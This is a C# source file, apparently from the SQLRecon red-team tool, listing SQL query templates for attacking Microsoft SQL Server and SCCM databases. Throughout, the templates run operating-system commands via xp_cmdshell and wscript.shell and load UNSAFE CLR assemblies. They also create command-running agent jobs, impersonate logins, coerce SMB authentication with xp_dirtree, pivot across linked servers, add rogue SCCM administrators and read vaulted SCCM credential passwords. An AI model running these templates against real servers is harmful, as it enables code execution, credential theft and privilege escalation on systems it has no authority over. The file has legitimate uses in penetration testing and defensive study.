namespace SQLRecon.Commands
{
    internal abstract class Query
    {
        internal static readonly string AddClrHash = "EXEC sp_add_trusted_assembly 0x{0},N'{1}, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';";
        
        internal static readonly string AddSccmAdmin = "INSERT INTO RBAC_Admins(AdminSID,LogonName,DisplayName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (@adminSID,'{0}','{1}',0,0,'','','','','{2}')";
        
        internal static readonly string AddSccmAdminPrivileges = "INSERT INTO [dbo].[RBAC_ExtendedPermissions] (AdminID,RoleID,ScopeID,ScopeTypeID) Values";
        
        internal static readonly string AlterDatabaseTrustOn ="ALTER DATABASE {0} SET TRUSTWORTHY ON;";
        
        internal static readonly string AlterDatabaseTrustOff ="ALTER DATABASE {0} SET TRUSTWORTHY OFF;";
        
        internal static readonly string CheckClrHash = "SELECT * FROM sys.trusted_assemblies WHERE hash = 0x{0};";
        
        internal static readonly string CheckImpersonation = "SELECT 1 FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' AND b.name = '{0}'";
        
        internal static readonly string CheckRole = "SELECT IS_SRVROLEMEMBER('{0}')";
        
        internal static readonly string CheckSccmAdminId = "Select AdminID from [dbo].[RBAC_Admins] where AdminSID = CAST(@data as VARBINARY)";
        
        internal static readonly string CheckSccmAdmins = "Select AdminID, AdminSID, LogonName from [dbo].[RBAC_Admins] where AdminSID = CAST(@data as VARBINARY)";
        
        internal static readonly string CheckSccmDatabase = "select name FROM sys.tables WHERE name = 'RBAC_Admins';";
        
        internal static readonly string CreateAgentJob = "use msdb;EXEC dbo.sp_add_job @job_name = '{0}';EXEC sp_add_jobstep @job_name = '{0}', @step_name = '{1}', @subsystem = '{2}', @command = '{3}', @retry_attempts = 1, @retry_interval = 5;EXEC dbo.sp_add_jobserver @job_name = '{0}';";
        
        internal static readonly string CreateAssembly = "CREATE ASSEMBLY {0} FROM 0x{1} WITH PERMISSION_SET = UNSAFE;";
        
        internal static readonly string CreateLdapServer = "use msdb; CREATE ASSEMBLY {0} AUTHORIZATION [dbo] FROM 0x{1} WITH PERMISSION_SET = UNSAFE;";
        
        internal static readonly string DeleteAgentJob = "use msdb; EXEC dbo.sp_delete_job  @job_name = '{0}';";
        
        internal static readonly string DeleteSccmAdmin = "Delete from [dbo].[RBAC_Admins] where AdminID={0}";
        
        internal static readonly string DeleteSccmUser = "Delete from [dbo].[RBAC_ExtendedPermissions] where ";
        
        internal static readonly string DropAdsiAssembly = "use msdb; DROP ASSEMBLY IF EXISTS {0};";
        
        internal static readonly string DropClrAssembly = "DROP ASSEMBLY IF EXISTS {0};";
        
        internal static readonly string DropClrHash = "EXEC sp_drop_trusted_assembly 0x{0};";
        
        internal static readonly string DropFunction = "use msdb; DROP FUNCTION IF EXISTS {0};";
        
        internal static readonly string DropProcedure = "DROP PROCEDURE IF EXISTS {0};";
        
        internal static readonly string EnableAdvancedOptions = "EXEC sp_configure 'show advanced options', 1;";
        
        internal static readonly string ExecuteAgentJob = "use msdb; EXEC dbo.sp_start_job '{0}'; WAITFOR DELAY '00:00:05';";
        
        internal static readonly string ExecutePayload = "EXEC {0}";
        
        internal static readonly string GetActiveSessions = "SELECT COUNT(*) FROM [sys].[dm_exec_sessions] WHERE status = 'running';";
        
        internal static readonly string GetAdsiLinkName = "SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;";
        
        internal static readonly string GetAgentJobs = "SELECT job_id, name, enabled, date_created, date_modified FROM msdb.dbo.sysjobs ORDER BY date_created;";
        
        internal static readonly string GetAgentStatus = "SELECT dss.[status], dss.[status_desc] FROM sys.dm_server_services dss WHERE dss.[servicename] LIKE 'SQL Server Agent (%';";
        
        internal static readonly string GetAssemblies = "SELECT * FROM sys.assemblies";
        
        internal static readonly string GetAssembly = "SELECT * FROM sys.assemblies where name = '{0}';";
        
        internal static readonly string GetAssemblyModules = "SELECT * FROM sys.assembly_modules";
        
        internal static readonly string GetAuthenticationMode = "DECLARE @AuthenticationMode INT EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE', N'Software\\Microsoft\\MSSQLServer\\MSSQLServer', N'LoginMode', @AuthenticationMode OUTPUT (SELECT CASE @AuthenticationMode WHEN 1 THEN 'Windows Authentication' WHEN 2 THEN 'Windows and SQL Server Authentication' ELSE 'Unknown' END);";
        
        internal static readonly string GetClustered = "SELECT CASE  SERVERPROPERTY('IsClustered') WHEN 0 THEN 'No' ELSE 'Yes' END";
        
        internal static readonly string GetColumns = "use {0}; SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{1}' ORDER BY ORDINAL_POSITION;";
        
        internal static readonly string GetComputerName = "SELECT @@SERVERNAME;"; 
        
        internal static readonly string GetCurrentLogon = "SELECT SYSTEM_USER;";
        
        internal static readonly string GetDatabases = "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;";
        
        internal static readonly string GetDatabaseUsers = "SELECT name AS username, create_date, modify_date, type_desc AS type, authentication_type_desc AS authentication_type FROM sys.database_principals WHERE type NOT IN ('A', 'R', 'X') AND sid IS NOT null AND name NOT LIKE '##%' ORDER BY modify_date DESC;";
        
        internal static readonly string GetDomainName = "SELECT DEFAULT_DOMAIN();";
        
        internal static readonly string GetForcedEncryption = "BEGIN TRY  DECLARE @ForcedEncryption INT EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE', N'SOFTWARE\\MICROSOFT\\Microsoft SQL Server\\MSSQLServer\\SuperSocketNetLib', N'ForceEncryption', @ForcedEncryption OUTPUT END TRY BEGIN CATCH	             END CATCH SELECT @ForcedEncryption;";
        
        internal static readonly string GetLinkedChainColumns = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{0}' ORDER BY ORDINAL_POSITION;";

        internal static readonly string GetLinkedChainRowCount = "SELECT COUNT(*) as row_count FROM {0};";

        internal static readonly string GetLinkedSqlServers = "SELECT name FROM sys.servers WHERE is_linked = 1;";
        
        internal static readonly string GetLinkedSqlServersVerbose = "SELECT srv.name AS [Linked Server], srv.product, srv.provider, srv.data_source, COALESCE(prin.name, 'N/A') AS [Local Login], ll.uses_self_credential AS [Is Self Mapping], ll.remote_name AS [Remote Login] FROM sys.servers srv LEFT JOIN sys.linked_logins ll ON srv.server_id = ll.server_id LEFT JOIN sys.server_principals prin ON ll.local_principal_id = prin.principal_id WHERE srv.is_linked = 1;";
        
        internal static readonly string GetModuleStatueVerbose = "SELECT configuration_id, name, value, value_in_use, description FROM sys.configurations WHERE name = '{0}';";
        
        internal static readonly string GetModuleStatus = "SELECT value FROM sys.configurations WHERE name = '{0}';";
        
        internal static readonly string GetOsArchitecture = "SELECT SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3);";
        
        internal static readonly string GetOsMachineType = "DECLARE @MachineType  SYSNAME EXECUTE master.dbo.xp_regread @rootkey= N'HKEY_LOCAL_MACHINE', @key= N'SYSTEM\\CurrentControlSet\\Control\\ProductOptions', @value_name= N'ProductType', @value= @MachineType output SELECT @MachineType;";
        
        internal static readonly string GetOsVersion = "DECLARE @ProductName  SYSNAME EXECUTE master.dbo.xp_regread @rootkey = N'HKEY_LOCAL_MACHINE', @key = N'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', @value_name = N'ProductName', @value = @ProductName output SELECT @ProductName;";
        
        internal static readonly string GetOsVersionNumber = "SELECT RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows Server', @@VERSION), 19), 4);";

        internal static readonly string GetPermissions = "SELECT permission_name FROM fn_my_permissions(NULL, '{0}');";
        
        internal static readonly string GetPrincipals = "SELECT name, type_desc, is_disabled, create_date, modify_date FROM sys.server_principals WHERE name NOT LIKE '##%' ORDER BY modify_date DESC;";
        
        internal static readonly string GetRowCount = "use {0}; SELECT COUNT(*) as row_count FROM {1};";
        
        internal static readonly string GetRpcStatus = "SELECT is_rpc_out_enabled FROM sys.servers WHERE lower(name) like '%{0}%';";
        
        internal static readonly string GetSccmAdminPrivileges = "select ScopeID,RoleID from [dbo].[RBAC_ExtendedPermissions] where AdminID = {0}";
        
        internal static readonly string GetSccmLogonUsers = "select Name00, Username00 from [dbo].[Computer_System_DATA]";
        
        internal static readonly string GetSccmPrivileges = "select LogonName, RoleName from [dbo].[v_SecuredScopePermissions]";
        
        internal static readonly string GetSccmSites = "select * from [dbo].[DPInfo]";
        
        internal static readonly string GetSccmTaskData = "select PkgID, Name, Sequence from [dbo].[vSMS_TaskSequencePackage]";
        
        internal static readonly string GetSccmTaskList = "select PkgID, Name from [dbo].[vSMS_TaskSequencePackage]";
        
        internal static readonly string GetSccmUsers = "select LogonName, AdminID, SourceSite, DistinguishedName from [dbo].[RBAC_Admins]";
        
        internal static readonly string GetSccmVaultedCredentialPasswords = "select UserName, Usage, Password from [dbo].[vSMS_SC_UserAccount]";
        
        internal static readonly string GetSccmVaultedCredentials = "select UserName, Usage from [dbo].[vSMS_SC_UserAccount]";
        
        internal static readonly string GetServicePid = "SELECT SERVERPROPERTY('processid');";
        
        internal static readonly string GetSqlMajorVersionNumber = "SELECT SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4);";
        
        internal static readonly string GetSqlServerEdition = "SELECT SERVERPROPERTY('Edition');";
        
        internal static readonly string GetSqlServerServiceName = "DECLARE @SQLServerServiceName varchar(250) DECLARE @SQLServerInstance varchar(250) if @@SERVICENAME = 'MSSQLSERVER' BEGIN set @SQLServerInstance = 'SYSTEM\\CurrentControlSet\\Services\\MSSQLSERVER' set @SQLServerServiceName = 'MSSQLSERVER' END ELSE BEGIN set @SQLServerInstance = 'SYSTEM\\CurrentControlSet\\Services\\MSSQL$'+cast(@@SERVICENAME as varchar(250)) set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250)) END SELECT @SQLServerServiceName;";
        
        internal static readonly string GetSqlServerServicePack = "SELECT SERVERPROPERTY('ProductLevel');";
        
        internal static readonly string GetSqlServiceAccountName = "DECLARE @SQLServerInstance varchar(250) if @@SERVICENAME = 'MSSQLSERVER' BEGIN set @SQLServerInstance = 'SYSTEM\\CurrentControlSet\\Services\\MSSQLSERVER' END ELSE BEGIN set @SQLServerInstance = 'SYSTEM\\CurrentControlSet\\Services\\MSSQL$'+cast(@@SERVICENAME as varchar(250)) END DECLARE @ServiceAccountName varchar(250) EXECUTE master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE', @SQLServerInstance, N'ObjectName',@ServiceAccountName OUTPUT, N'no_output' SELECT @ServiceAccountName;";
        
        internal static readonly string GetSqlUsersAndWindowsPrincipals = "SELECT name FROM sys.server_principals WHERE type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN') AND name NOT LIKE '##%';";
        
        internal static readonly string GetSqlVersionNumber = "SELECT SERVERPROPERTY('productversion');";
        
        internal static readonly string GetStoredProcedures = "SELECT SCHEMA_NAME(schema_id), name FROM sys.procedures WHERE type = 'PC';";
        
        internal static readonly string GetTables = "SELECT * FROM {0}.INFORMATION_SCHEMA.TABLES;";
        
        internal static readonly string GetTrustedAssemblies = "SELECT * FROM sys.trusted_assemblies;";
        
        internal static readonly string ImpersonationLogin = "EXECUTE AS LOGIN = '{0}'; ";
        
        internal static readonly string IsRpcEnabled = "SELECT name, is_rpc_out_enabled FROM sys.servers";
        
        internal static readonly string LinkedChainSearchColumns = "SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE '%{0}%';";

        internal static readonly string LinkedChainToggleModule = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure '{0}', {1}; RECONFIGURE;";
        
        internal static readonly string LinkedEnableAdvancedOptions = "sp_configure 'show advanced options', 1; RECONFIGURE;";
        
        internal static readonly string LinkedSmbRequest = "SELECT 1; EXEC master..xp_dirtree \"{0}\";";
        
        internal static readonly string LinkedToggleModule = "sp_configure '{0}', {1}; RECONFIGURE;";
        
        internal static readonly string LinkedXpCmd = "SELECT 1; exec master..xp_cmdshell '{0}'";
        
        internal static readonly string LoadDllIntoStoredProcedure = "CREATE PROCEDURE [dbo].[{0}] AS EXTERNAL NAME [{1}].[StoredProcedures].[{0}];";
        
        internal static readonly string LoadLdapServer = "CREATE FUNCTION [dbo].{0}(@port int) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME {1}.[ldapAssembly.LdapSrv].listen;";
        
        internal static readonly string OleExecution = "DECLARE @{0} INT; DECLARE @{1} VARCHAR(255);SET @{1} = 'Run(\"{2}\")';EXEC sp_oacreate 'wscript.shell', @{0} out;EXEC sp_oamethod @{0}, @{1};EXEC sp_oadestroy @{0};";
        
        internal static readonly string OleLinkedExecution = "SELECT 1; DECLARE @{0} INT; DECLARE @{1} VARCHAR(255);SET @{1} = 'Run(\"{2}\")';EXEC sp_oacreate 'wscript.shell', @{0} out;EXEC sp_oamethod @{0}, @{1};EXEC sp_oadestroy @{0};";
        
        internal static readonly string Roles = "SELECT [name] FROM sysusers WHERE issqlrole = 1";
        
        internal static readonly string RunLdapServer = "SELECT * FROM 'LDAP://localhost:{0}'";
        
        internal static readonly string SccmFilterLogonUsers = "select [dbo].[System_IP_Address_ARR].IP_Addresses0 as 'IP_Addr', [dbo].[Computer_System_Data].Name00 as 'Host', [dbo].[Computer_System_Data].UserName00 as 'User' from [dbo].[System_IP_Address_ARR],[dbo].[Computer_System_Data] where System_IP_Address_ARR.ItemKey = Computer_System_DATA.MachineID and System_IP_Address_ARR.NumericIPAddressValue > 0 and (";
        
        internal static readonly string SccmSiteCode = "select ThisSiteCode from [dbo].[v_Identification]";
        
        internal static readonly string SearchColumns = "use {0}; SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE '%{1}%';";
        
        internal static readonly string SmbRequest = "EXEC master..xp_dirtree \"{0}\";";
        
        internal static readonly string StartLdapServer = "SELECT dbo.{0}({1});";
        
        internal static readonly string SystemUser = "SELECT SYSTEM_USER;";
        
        internal static readonly string ToggleModule = "RECONFIGURE; EXEC sp_configure '{0}', {1}; RECONFIGURE;";
        
        internal static readonly string ToggleRpc = "EXEC sp_serveroption '{0}', 'rpc out', '{1}';";
        
        internal static readonly string UserName = "SELECT USER_NAME();";
        
        internal static readonly string XpCmd = "EXEC xp_cmdshell '{0}';";
    }
}